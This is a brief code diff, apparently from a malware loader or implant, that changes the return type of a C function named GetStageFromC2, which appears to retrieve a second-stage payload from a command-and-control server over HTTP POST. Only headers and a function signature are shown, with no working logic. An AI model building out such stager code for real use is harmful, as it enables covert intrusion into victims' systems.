@@ -8,7 +8,7 @@
 #define _POST_HEADER L"Content-Type: application/x-www-form-urlencoded\r\n"
 #define _HEADER_LEN -1
 
-INT GetStageFromC2(DWORD* sSize)
+CHAR* GetStageFromC2(DWORD* sSize)
 {
     DWORD Flags;
     char* payload;
